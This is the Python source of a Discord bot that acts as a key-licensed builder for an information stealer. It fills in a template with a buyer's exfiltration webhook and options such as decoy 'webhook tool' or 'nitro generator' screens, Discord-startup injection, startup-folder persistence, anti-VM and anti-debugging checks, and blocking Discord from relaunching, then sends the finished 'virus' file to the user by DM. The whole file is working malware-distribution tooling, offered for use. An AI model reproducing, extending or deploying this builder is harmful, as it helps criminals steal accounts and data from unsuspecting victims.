import discord
from discord.ext import commands
import base64, secrets, asyncio
import discord, uuid
from discord import app_commands
import traceback

Red = "\033[0;31m"
End = "\033[0m"
Green = "\033[0;32m"
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
bot.remove_command('help')

Bot_token = 'Bot Token'
channelid = 123456 # The channel where the builder will work
admin = 123456 # The admin ID (He can generate key for user)
import os
os.makedirs('./Build', exist_ok=True)
@bot.event
async def on_ready():
    await bot.tree.sync()
    print("Bot en ligne !")


def makestealer(webhook, fakewebhook,fakegenerator, injection, startup, no_debug, close):
    with open('stealercode.py', 'r', encoding='utf-8', errors='replace') as file:
        content = file.read()
    
    new_content = content.replace("%Webhook%", webhook)
    new_content = new_content.replace("'%FakeWebhook%'", str(fakewebhook))
    new_content = new_content.replace("'%FakeGen%'", str(fakegenerator))
    new_content = new_content.replace("'%Injection%'", str(injection))
    new_content = new_content.replace("'%Startup%'", str(startup))
    new_content = new_content.replace("'%No_Debug%'", str(no_debug))
    new_content = new_content.replace("'%Close%'", str(close))
    
    filename = str(uuid.uuid4())
    
    with open(f'./Build/{filename}.py', 'w', encoding='utf-8') as file:
        file.write(new_content)
    return f'./Build/{filename}.py'    
@bot.tree.command(name="build", description="Generate a key to use the Builder")
async def Build(interaction: discord.Interaction, key: str):
    user_id = str(interaction.user.id)

    if interaction.channel_id != channelid:
        embed=discord.Embed(title="Error", description=f"Wrong Channel ! use in <#{channelid}>", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return

    with open('keys.txt', 'r') as f:
        lines = f.readlines()

    key_valid = False

    for line in lines:
        parts = line.strip().split("|")
        stored_user_id = parts[0]
        stored_key = parts[1]
        stored_username = parts[2]

        if user_id == stored_user_id and key == stored_key:
            key_valid = True
            break
        elif key == stored_key:
            embed=discord.Embed(title="Error", description=f"Invalid key!", color=0xff0000)
            await interaction.response.send_message(embed=embed)
            print(f"\n{Red}User{End}: {interaction.user.name} used a working key\n{Red}but not their own key{End}: {key}\n{Red}Username of the person that owns the key{End}: {stored_username}\n")
            return

    if not key_valid:
        embed=discord.Embed(title="Error", description=f"Invalid key!", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return

    try:
        embed=discord.Embed(title="Stealer Setup", description=f"Please provide a webhook URL:", color=0xff0000)
        await interaction.user.send(embed=embed)
        
        def check_message(msg):
            return msg.author == interaction.user and isinstance(msg.channel, discord.DMChannel)
    
        webhook_message = await bot.wait_for("message", check=check_message, timeout=60.0)
        webhook = webhook_message.content
    except asyncio.TimeoutError:
        embed=discord.Embed(title="Error", description=f"Take too much time to respond.The operation was canceled.", color=0xff0000)
        await interaction.user.send(embed=embed)
        return

    emoji_yes = '✅'
    emoji_no = '❌'
    questions = [
        ("Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data)?", "React with the corresponding emoji below:"),
        ("Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data)?", "React with the corresponding emoji below:"),
        ("Do you want to inject the script to Discord Startup?", "React with the corresponding emoji below:"),
        ("Do you want to add the file to the startup folder?", "React with the corresponding emoji below:"),
        ("Do you want to enable VM Checker and Anti Debugging?", "React with the corresponding emoji below:"),
        ("Do you want to prevent Discord from being launched again?", "React with the corresponding emoji below:"),
    ]

    fake_webhook = None
    fake_generator = None
    inject_startup = None
    add_to_startup = None
    vm_checker = None
    prevent_relaunch = None

    for question, reaction_prompt in questions:
        
        embed=discord.Embed(title="Stealer Setup", description=f"{question}\n{reaction_prompt}", color=0xFF5733)
        embed.set_footer(text=f'{emoji_yes} for Yes, {emoji_no} for No')
        question_message = await interaction.user.send(embed=embed)

        await question_message.add_reaction(emoji_yes)
        await question_message.add_reaction(emoji_no)

        def check_reaction(reaction, user):
            return user == interaction.user and str(reaction.emoji) in [emoji_yes, emoji_no]

        try:
            reaction, _ = await bot.wait_for("reaction_add", check=check_reaction, timeout=60.0)
            user_response = 'True' if str(reaction.emoji) == emoji_yes else 'False'
            if question.startswith("Do you want to enable Fake Webhook Module"):
                fake_webhook = user_response
            elif question.startswith("Do you want to enable Fake Generator Module"):
                fake_generator = user_response
            elif question.startswith("Do you want to inject the script to Discord Startup"):
                inject_startup = user_response
            elif question.startswith("Do you want to add the file to the startup folder"):
                add_to_startup = user_response
            elif question.startswith("Do you want to enable VM Checker and Anti Debugging"):
                vm_checker = user_response
            elif question.startswith("Do you want to prevent Discord from being launched again"):
                prevent_relaunch = user_response
        except asyncio.TimeoutError:
            
            embed=discord.Embed(title="Error", description=f"Take too much time to respond.The operation was canceled.", color=0xff0000)
            await interaction.user.send(embed=embed)
            return

    
    output = makestealer(webhook,fake_webhook,fake_generator, inject_startup, add_to_startup, vm_checker, prevent_relaunch)
    print(output)
    embed = discord.Embed(title="Here your stealer !", description="Thanks for using our service", color=0x00ff00)
    await interaction.user.send(file=discord.File(f'{output}'), embed=embed)

@bot.tree.command(name="help", description="Here's a command to get help for the bot")
async def help(interaction: discord.Interaction):
    embed = discord.Embed(title="Commands List", description="", color=0x00ff00)
    embed.add_field(name="Admin Command:", value="```generatekey + (User)```\nThis command will generate a key for the user to build the stealer from the bot", inline=False)
    embed.add_field(name="User command:", value="```Build + (Webhook) + (Key)```\nThis command will generate the virus with the chosen webhook", inline=False)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="generatekey", description="Generate a key to use the Builder")
@commands.is_owner()
async def generatekey(interaction: discord.Interaction, user: discord.Member):
    if interaction.user.id == admin:
        secr = secrets.token_urlsafe(32)
        with open('keys.txt', "a") as f:
            f.write(f"{user.id}|{secr}|{user.name}\n")
        print(f"{Red}New{End} Generated key\n{Red}User{End}: {user.id}\n{Red}Key{End}: {secr}\n{Red}Username{End}: {user.name}")

        embed = discord.Embed(title="Here your key :", description="Thanks for using our service.", color=0x00ff00)
        embed.add_field(name="Key:\n", value=f"{secr}", inline=False)
        embed.add_field(name="How to use it:\n", value=f"Go into the command channel and do ```/Build (key) (Webhook)``` and the program will be sent into your DM", inline=False)
        await user.send(embed=embed)
        await interaction.response.send_message(f"Key generated successfully sended to {user}")
        
    else:
        await interaction.response.send_message("You don't have the permission to use that command")

@bot.tree.command(name="ban", description="Ban a user")
@commands.has_permissions(ban_members=True)
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    await member.ban(reason=reason)
    await interaction.response.send_message(f"User {member.mention} has been banned.")


bot.run(Bot_token)
